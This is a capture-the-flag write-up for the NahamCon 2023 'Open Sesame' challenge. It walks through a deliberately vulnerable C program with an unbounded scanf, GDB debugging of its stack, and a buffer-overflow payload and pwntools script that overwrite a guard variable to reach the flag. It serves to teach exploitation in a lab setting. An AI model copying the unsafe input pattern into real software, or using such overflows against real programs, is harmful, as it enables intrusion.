---
title: NahamCon CTF 2023 - Open Sesame
date: 2023-06-19 09:00:00 +0800
categories: [NahamCon CTF 2023, Binary Exploitation]
tags: [binary-exploitation, pwn, buffer-overflow, gdb]
media_subpath: /assets/img/ctfs/nahamcon2023/open-sesame/
image:
  path: open-sesame.jpg
---

## Info

| Name                                                                             | Difficulty | Author                                          |
|----------------------------------------------------------------------------------|------------|:------------------------------------------------|
| [Open Sesame](https://github.com/v3he/ctfs/tree/master/nahamcon2023/open-sesame) | Easy       | [JohnHammond](https://twitter.com/_johnhammond) |

> Something about forty thieves or something? I don't know, they must have had some secret incantation to get the gold!
{: .prompt-info }

## Source Code

For this challenge we are provided with the binary and the source code, which will make it much easier to identify vulnerabilities, you can download the files from the link in the Info section or from [here](https://github.com/v3he/ctfs/tree/master/nahamcon2023/open-sesame).

```c
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#define SECRET_PASS "OpenSesame!!!"

typedef enum {no, yes} Bool;

void flushBuffers() {
    fflush(NULL);
}

void flag() {  
    system("/bin/cat flag.txt");
    flushBuffers();
}

Bool isPasswordCorrect(char *input) {
    return (strncmp(input, SECRET_PASS, strlen(SECRET_PASS)) == 0) ? yes : no;
}

void caveOfGold() {

    Bool caveCanOpen = no;
    char inputPass[256];
    
    puts("BEHOLD THE CAVE OF GOLD\n");

    puts("What is the magic enchantment that opens the mouth of the cave?");
    flushBuffers();
    
    scanf("%s", inputPass);

    if (caveCanOpen == no) {
        puts("Sorry, the cave will not open right now!");
        flushBuffers();
        return;
    }

    if (isPasswordCorrect(inputPass) == yes) {
        puts("YOU HAVE PROVEN YOURSELF WORTHY HERE IS THE GOLD:");
        flag();
    } else {
        puts("ERROR, INCORRECT PASSWORD!");
        flushBuffers();
    }
}

int main() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    caveOfGold();
    return 0;
}
```

### Analysis

The program starts by calling the function `caveOfGold()`, it creates a `256` byte buffer and does a `scanf("%s")` without specifying a read size, which makes it vulnerable to `buffer overflow`.

In case the `caveCanOpen` variable is set to `no`, an error message is displayed and the program exits, otherwise `isPasswordCorrect()` is called which checks if the password entered is the same as the one the program has hardcoded `#define SECRET_PASS "OpenSesame!!!"` and calls the `flag()` function which displays the flag for the challenge.

The goal is simple, we know that the password is `OpenSesame!!!` so all we have to do is enter this password when the program asks us. The problem is the check of the variable `caveCanOpen`, since this one is hardcoded to `no`, so technically, we are not going to reach the verification of the password due to this clause. So somehow, first we have to find a way to skip the check: 

```c
Bool caveCanOpen = no;

[...]

if (caveCanOpen == no) {
    puts("Sorry, the cave will not open right now!");
    flushBuffers();
    return;
}
```

## Debugging

I will explain the whole debugging process from the beginning, if you just want the solution you can skip to the [Exploitation](#exploitation) section.

> I am using the version of GDB with GEF (GDB Enhanced Features) that you can download from [here](https://github.com/hugsy/gef).
{: .prompt-info }

### Open binary with GDB

To open the binary with gdb we will execute the following command:

> `-q` option is used to start GDB in quiet mode.
{: .prompt-info }

```bash
$ gdb -q open_sesame
```
{: .nolineno }

Lets run the program for the first time with the `r` command, so we can see the normal execution flow.

```bash
gef➤  r
Starting program: /home/kali/ctf/nahamcon2023/open-sesame/open_sesame 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
BEHOLD THE CAVE OF GOLD

What is the magic enchantment that opens the mouth of the cave?
OpenSesame!!!
Sorry, the cave will not open right now!
[Inferior 1 (process 53918) exited normally]
```
{: .nolineno }

### Disassemble caveOfGold

Let's see the disassembly of the caveOfGold function, which is the main part of the program.

```bash
gef➤  disassemble caveOfGold
Dump of assembler code for function caveOfGold:
   0x00005555555551eb <+0>:     push   rbp
   0x00005555555551ec <+1>:     mov    rbp,rsp
   0x00005555555551ef <+4>:     sub    rsp,0x110
   0x00005555555551f6 <+11>:    mov    DWORD PTR [rbp-0x4],0x0
   0x00005555555551fd <+18>:    lea    rax,[rip+0xe24]        # 0x555555556028
   0x0000555555555204 <+25>:    mov    rdi,rax
   0x0000555555555207 <+28>:    call   0x555555555040 <puts@plt>
   0x000055555555520c <+33>:    lea    rax,[rip+0xe35]        # 0x555555556048
   0x0000555555555213 <+40>:    mov    rdi,rax
   0x0000555555555216 <+43>:    call   0x555555555040 <puts@plt>
   0x000055555555521b <+48>:    mov    eax,0x0
   0x0000555555555220 <+53>:    call   0x555555555189 <flushBuffers>
   0x0000555555555225 <+58>:    lea    rax,[rbp-0x110]
   0x000055555555522c <+65>:    mov    rsi,rax
   0x000055555555522f <+68>:    lea    rax,[rip+0xe52]        # 0x555555556088
   0x0000555555555236 <+75>:    mov    rdi,rax
   0x0000555555555239 <+78>:    mov    eax,0x0
   0x000055555555523e <+83>:    call   0x555555555080 <__isoc99_scanf@plt>
   0x0000555555555243 <+88>:    cmp    DWORD PTR [rbp-0x4],0x0
   0x0000555555555247 <+92>:    jne    0x555555555264 <caveOfGold+121>
   0x0000555555555249 <+94>:    lea    rax,[rip+0xe40]        # 0x555555556090
   0x0000555555555250 <+101>:   mov    rdi,rax
   0x0000555555555253 <+104>:   call   0x555555555040 <puts@plt>
   0x0000555555555258 <+109>:   mov    eax,0x0
   0x000055555555525d <+114>:   call   0x555555555189 <flushBuffers>
   0x0000555555555262 <+119>:   jmp    0x5555555552ac <caveOfGold+193>
   0x0000555555555264 <+121>:   lea    rax,[rbp-0x110]
   0x000055555555526b <+128>:   mov    rdi,rax
   0x000055555555526e <+131>:   call   0x5555555551ba <isPasswordCorrect>
   0x0000555555555273 <+136>:   cmp    eax,0x1
   0x0000555555555276 <+139>:   jne    0x555555555293 <caveOfGold+168>
   0x0000555555555278 <+141>:   lea    rax,[rip+0xe41]        # 0x5555555560c0
   0x000055555555527f <+148>:   mov    rdi,rax
   0x0000555555555282 <+151>:   call   0x555555555040 <puts@plt>
   0x0000555555555287 <+156>:   mov    eax,0x0
   0x000055555555528c <+161>:   call   0x55555555519a <flag>
   0x0000555555555291 <+166>:   jmp    0x5555555552ac <caveOfGold+193>
   0x0000555555555293 <+168>:   lea    rax,[rip+0xe58]        # 0x5555555560f2
   0x000055555555529a <+175>:   mov    rdi,rax
   0x000055555555529d <+178>:   call   0x555555555040 <puts@plt>
   0x00005555555552a2 <+183>:   mov    eax,0x0
   0x00005555555552a7 <+188>:   call   0x555555555189 <flushBuffers>
   0x00005555555552ac <+193>:   leave
   0x00005555555552ad <+194>:   ret
End of assembler dump.
```
{: .nolineno }

In the function disassembly code, we can see two things:
- `[...] <+58>: read rax,[rbp-0x110]`, `rbp-0x110` is where the input is stored
- `[...] <+88>: cmp DWORD PTR [rbp-0x4],0x0`, `rbp-0x4` is the static variable caveCanOpen.

Lets set a breakpoint just before the `caveCanOpen == no` check (`cmp DWORD PTR [rbp-0x4],0x0`).

```bash
gef➤  b *0x555555555243
Breakpoint 1 at 0x555555555243
```
{: .nolineno }

We are going to run the program again but this time we are going to put `256 "A"` as input to see how the stack is arranged.

```bash
gef➤  r
Starting program: /home/kali/ctf/nahamcon2023/open-sesame/open_sesame 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
BEHOLD THE CAVE OF GOLD

What is the magic enchantment that opens the mouth of the cave?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x0000555555555243 in caveOfGold ()
[...]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555236 <caveOfGold+75>  mov    rdi, rax
   0x555555555239 <caveOfGold+78>  mov    eax, 0x0
   0x55555555523e <caveOfGold+83>  call   0x555555555080 <__isoc99_scanf@plt>
●→ 0x555555555243 <caveOfGold+88>  cmp    DWORD PTR [rbp-0x4], 0x0
   0x555555555247 <caveOfGold+92>  jne    0x555555555264 <caveOfGold+121>
   0x555555555249 <caveOfGold+94>  lea    rax, [rip+0xe40]        # 0x555555556090
   0x555555555250 <caveOfGold+101> mov    rdi, rax
   0x555555555253 <caveOfGold+104> call   0x555555555040 <puts@plt>
   0x555555555258 <caveOfGold+109> mov    eax, 0x0
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "open_sesame", stopped 0x555555555243 in caveOfGold (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555243 → caveOfGold()
[#1] 0x5555555552e4 → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```
{: .nolineno }

First we obtain the buffer and variable addresses. Let's also see how the stack is positioned starting from the buffer.

```bash
gef➤  print $rbp-0x110
$1 = (void *) 0x7fffffffdc40
gef➤  print $rbp-0x4
$2 = (void *) 0x7fffffffdd4c
```
{: .nolineno }

![Open Sesame Stack](stack.png)

We can see that both the buffer and the variable are in contiguous regions of memory, and because the buffer is vulnerable to buffer overflow, we can enter enough data to overwrite the variable so that it is no longer 0.

Let's restart the program and try again but this time with `270 "A"`

![Open Sesame Stack Overflow](stack-overflow.png)

Great! we have overwritten the variable, let's see what happens now if we continue with the execution of the program:

```bash
gef➤  c
Continuing.
ERROR, INCORRECT PASSWORD!
[Inferior 1 (process 90143) exited normally]
```
{: .nolineno }

Perfect, we no longer see the `Sorry, the cave will not open right now!` message, which means that we have bypassed the check of the variable when overwriting it and now we get to the execution of the `isPasswordCorrect()` function.

## Exploitation

Let's recap, we know that if we entered `270 characters`, we can overwrite the `caveCanOpen` variable, which allows us to get to `isPasswordCorrect()` which is going to check the input and see if it matches `OpenSesame!!!`.

Let's remember what isPasswordCorrect does:

```c
Bool isPasswordCorrect(char *input) {
    return (strncmp(input, SECRET_PASS, strlen(SECRET_PASS)) == 0) ? yes : no;
}
```
{: .nolineno }

Extracts from our input as many characters as the length of the password, and then check that it is the same as `OpenSesame!!!`. Basically, it selects the first `13 characters` of our input and checks that they match the password.

### Crafting the Payload

The plan is simple, instead of sending 270 "A", we will send `OpenSesame!!! + (270 - 13) "A"`, which would look something like this:

```bash
$ python -c 'print("OpenSesame!!!" + "A" * (270 - 13))'
OpenSesame!!!AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
{: .nolineno }

```bash
$ ./open_sesame 
BEHOLD THE CAVE OF GOLD

What is the magic enchantment that opens the mouth of the cave?
OpenSesame!!!AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
YOU HAVE PROVEN YOURSELF WORTHY HERE IS THE GOLD:
flag{share_the_post_if_you_liked}
```
{: .nolineno }

and there we have the flag!

### Exploit with pwntools

We can make this whole process a little more automatic by using pwntools with the following script.

```python
#!/usr/bin/python3

from pwn import *

p = process("./open_sesame")

buff = "A" * 256
secret_pass = "OpenSesame!!!"

p.recvuntil(b"What is the magic enchantment that opens the mouth of the cave?")
p.sendline(str.encode(secret_pass + buff))

print(p.recvall())
```

## Final Thoughts

An easy challenge since we had the support of the source code, but still very interesting to practice.